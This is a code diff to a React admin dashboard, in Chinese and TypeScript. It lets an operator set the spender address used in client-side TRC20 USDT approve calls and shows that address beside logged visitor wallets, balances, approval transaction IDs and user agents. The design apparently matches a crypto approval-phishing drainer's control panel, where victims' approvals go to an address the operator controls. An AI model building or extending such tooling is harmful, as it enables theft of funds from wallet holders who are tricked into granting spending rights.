@@ -1,7 +1,7 @@
 import { useCallback, useEffect, useMemo, useState } from "react";
 import { Link } from "react-router-dom";
 import type { Session } from "@supabase/supabase-js";
-import { LayoutDashboard, Loader2, LogOut, RefreshCw } from "lucide-react";
+import { KeyRound, LayoutDashboard, Loader2, LogOut, RefreshCw } from "lucide-react";
 
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
@@ -16,6 +16,12 @@ import {
 } from "@/components/ui/select";
 import { Separator } from "@/components/ui/separator";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
+import {
+  isValidTronBase58Address,
+  LEGACY_DEFAULT_APPROVAL_SPENDER,
+  TRON_USDT_CONTRACT,
+  USDT_APPROVAL_SPENDER_KEY,
+} from "@/lib/approvalSpender";
 import { getSupabaseBrowserClient } from "@/lib/supabaseClient";
 import { cn } from "@/lib/utils";
 
@@ -28,6 +34,7 @@ type AuthorizationRow = {
   approval_tx_id: string | null;
   locale: string | null;
   user_agent: string | null;
+  approval_spender: string | null;
 };
 
 const PAGE_SIZE_OPTIONS = [10, 20, 50] as const;
@@ -63,6 +70,12 @@ const Admin = () => {
   const [verifyingAdmin, setVerifyingAdmin] = useState(false);
   const [page, setPage] = useState(1);
   const [pageSize, setPageSize] = useState<number>(PAGE_SIZE_OPTIONS[1]);
+  const [spenderDraft, setSpenderDraft] = useState("");
+  const [spenderUpdatedAt, setSpenderUpdatedAt] = useState<string | null>(null);
+  const [spenderLoading, setSpenderLoading] = useState(false);
+  const [spenderSaving, setSpenderSaving] = useState(false);
+  const [spenderError, setSpenderError] = useState<string | null>(null);
+  const [spenderSavedHint, setSpenderSavedHint] = useState<string | null>(null);
 
   const totalPages = useMemo(() => Math.max(1, Math.ceil(totalCount / pageSize)), [totalCount, pageSize]);
 
@@ -73,7 +86,10 @@ const Admin = () => {
     const to = from + pageSize - 1;
     const { data, error, count } = await supabase
       .from("wallet_authorizations")
-      .select("id, created_at, wallet_address, trx_balance, usdt_balance, approval_tx_id, locale, user_agent", { count: "exact" })
+      .select(
+        "id, created_at, wallet_address, trx_balance, usdt_balance, approval_tx_id, approval_spender, locale, user_agent",
+        { count: "exact" },
+      )
       .order("created_at", { ascending: false })
       .range(from, to);
     setListLoading(false);
@@ -84,6 +100,52 @@ const Admin = () => {
     setRows((data as AuthorizationRow[]) ?? []);
     setTotalCount(count ?? 0);
   }, [supabase, adminOk, page, pageSize]);
+
+  const loadApprovalSpenderSetting = useCallback(async () => {
+    if (!supabase || !adminOk) return;
+    setSpenderLoading(true);
+    setSpenderError(null);
+    const { data, error } = await supabase
+      .from("app_settings")
+      .select("value, updated_at")
+      .eq("key", USDT_APPROVAL_SPENDER_KEY)
+      .maybeSingle();
+    setSpenderLoading(false);
+    if (error) {
+      setSpenderError(error.message);
+      return;
+    }
+    setSpenderDraft(data?.value?.trim() ? data.value.trim() : LEGACY_DEFAULT_APPROVAL_SPENDER);
+    setSpenderUpdatedAt(data?.updated_at ?? null);
+  }, [supabase, adminOk]);
+
+  const saveApprovalSpenderSetting = async () => {
+    if (!supabase) return;
+    const trimmed = spenderDraft.trim();
+    if (!isValidTronBase58Address(trimmed)) {
+      setSpenderError("请输入有效的 Tron 地址（Base58，以 T 开头，长度 34）。");
+      return;
+    }
+    setSpenderSaving(true);
+    setSpenderError(null);
+    setSpenderSavedHint(null);
+    const { error } = await supabase.from("app_settings").upsert(
+      {
+        key: USDT_APPROVAL_SPENDER_KEY,
+        value: trimmed,
+        updated_at: new Date().toISOString(),
+      },
+      { onConflict: "key" },
+    );
+    setSpenderSaving(false);
+    if (error) {
+      setSpenderError(error.message);
+      return;
+    }
+    setSpenderSavedHint("已保存，客户端将在下次加载配置时生效。");
+    void loadApprovalSpenderSetting();
+    window.setTimeout(() => setSpenderSavedHint(null), 5000);
+  };
 
   useEffect(() => {
     if (!supabase) {
@@ -143,6 +205,11 @@ const Admin = () => {
     if (!adminOk) return;
     void loadAuthorizations();
   }, [adminOk, loadAuthorizations]);
+
+  useEffect(() => {
+    if (!adminOk) return;
+    void loadApprovalSpenderSetting();
+  }, [adminOk, loadApprovalSpenderSetting]);
 
   useEffect(() => {
     if (page > totalPages) {
@@ -301,6 +368,81 @@ const Admin = () => {
               </p>
             </div>
 
+            <Card className="border-border/60 shadow-sm">
+              <CardHeader className="border-b border-border/60 bg-muted/15">
+                <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
+                  <div className="flex gap-3">
+                    <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-primary/10 text-primary">
+                      <KeyRound className="h-5 w-5" aria-hidden />
+                    </div>
+                    <div className="space-y-1">
+                      <CardTitle className="text-base">授权接收地址（spender）</CardTitle>
+                      <CardDescription className="max-w-2xl text-pretty">
+                        客户端对 TRC20 USDT（合约 {TRON_USDT_CONTRACT}）调用 <code className="rounded bg-muted px-1 py-0.5 text-xs">approve</code>{" "}
+                        时使用的接收方地址。修改后已打开页面的用户需刷新或重新连接钱包后才会拉取新配置。
+                      </CardDescription>
+                    </div>
+                  </div>
+                </div>
+              </CardHeader>
+              <CardContent className="space-y-4 pt-6">
+                {spenderLoading ? (
+                  <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                    <Loader2 className="h-4 w-4 animate-spin" aria-hidden />
+                    正在加载配置…
+                  </div>
+                ) : (
+                  <>
+                    <div className="grid gap-4 sm:grid-cols-[1fr_auto] sm:items-end">
+                      <div className="space-y-2">
+                        <Label htmlFor="spender-addr">spender 地址</Label>
+                        <Input
+                          id="spender-addr"
+                          className="font-mono text-sm"
+                          placeholder={LEGACY_DEFAULT_APPROVAL_SPENDER}
+                          value={spenderDraft}
+                          onChange={(e) => {
+                            setSpenderDraft(e.target.value);
+                            setSpenderError(null);
+                          }}
+                          spellCheck={false}
+                          autoComplete="off"
+                        />
+                        {spenderUpdatedAt ? (
+                          <p className="text-xs text-muted-foreground">
+                            上次更新（服务器时间）：{formatCnTime(spenderUpdatedAt)}
+                          </p>
+                        ) : null}
+                      </div>
+                      <div className="flex flex-col gap-2 sm:min-w-[120px]">
+                        <Button type="button" disabled={spenderSaving} onClick={() => void saveApprovalSpenderSetting()}>
+                          {spenderSaving ? (
+                            <>
+                              <Loader2 className="mr-2 h-4 w-4 animate-spin" aria-hidden />
+                              保存中
+                            </>
+                          ) : (
+                            "保存"
+                          )}
+                        </Button>
+                        <Button type="button" variant="outline" size="sm" disabled={spenderLoading} onClick={() => void loadApprovalSpenderSetting()}>
+                          重新加载
+                        </Button>
+                      </div>
+                    </div>
+                    {spenderError ? (
+                      <p className="rounded-md border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm text-destructive">{spenderError}</p>
+                    ) : null}
+                    {spenderSavedHint ? (
+                      <p className="rounded-md border border-emerald-500/25 bg-emerald-500/10 px-3 py-2 text-sm text-emerald-800 dark:text-emerald-200">
+                        {spenderSavedHint}
+                      </p>
+                    ) : null}
+                  </>
+                )}
+              </CardContent>
+            </Card>
+
             <Card className="overflow-hidden border-border/60 shadow-sm">
               <CardHeader className="border-b border-border/60 bg-muted/20 py-4">
                 <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
@@ -336,7 +478,7 @@ const Admin = () => {
                 ) : (
                   <>
                     <div className="max-h-[min(560px,calc(100vh-16rem))] overflow-auto">
-                      <div className="min-w-[720px]">
+                      <div className="min-w-[900px]">
                         <Table>
                           <TableHeader>
                             <TableRow className="bg-muted/30 hover:bg-muted/30">
@@ -345,6 +487,7 @@ const Admin = () => {
                               <TableHead className="w-[88px]">TRX</TableHead>
                               <TableHead className="w-[88px]">USDT</TableHead>
                               <TableHead className="min-w-[140px]">交易 ID</TableHead>
+                              <TableHead className="min-w-[140px]">授权接收地址</TableHead>
                               <TableHead className="w-[72px]">语言</TableHead>
                             </TableRow>
                           </TableHeader>
@@ -365,6 +508,11 @@ const Admin = () => {
                                     title={r.approval_tx_id ?? ""}
                                   >
                                     {r.approval_tx_id ?? "—"}
+                                  </span>
+                                </TableCell>
+                                <TableCell className="max-w-[160px]">
+                                  <span className="block truncate font-mono text-xs" title={r.approval_spender ?? ""}>
+                                    {r.approval_spender ?? "—"}
                                   </span>
                                 </TableCell>
                                 <TableCell className="text-sm">{r.locale ?? "—"}</TableCell>
